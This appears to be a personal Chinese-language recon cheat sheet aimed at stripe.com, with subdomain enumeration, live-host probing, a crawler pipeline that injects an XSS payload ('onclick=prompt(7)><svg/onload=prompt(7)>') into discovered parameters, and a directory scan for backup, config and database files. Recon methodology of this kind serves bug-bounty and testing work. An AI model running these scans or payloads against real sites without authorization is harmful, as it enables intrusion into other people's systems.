<center>Stripe</center>





[toc]









## Stripe

>  Stripe 实现线上线下支付共通.
>
>  [stripe](https://stripe.com/)  [youtube](https://www.youtube.com/watch?v=X44t8tCXivI)
>
>  paylodebox: [github](https://github.com/payloadbox)
>
>  快速发现漏洞： [blog](https://gugesay.com/archives/1186)









### 1. 子域名收集

```shell
subfinder -d stripe.com -all -recursive > subdomain.txt

# 查看存活主机
cat subdomain.txt | httpx-toolkit -mc 200 -o livehosts.txt

# 存在xss
subfinder -d stripe.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"onclick=prompt(7)><svg/onload=prompt(7)>"@x.y' -parameters  

# 目录扫描
dirsearch -u https://www.stripe.com -e conf,config,backup,bak,old,db,sql,asp,aspx,php,zip  
# 
```

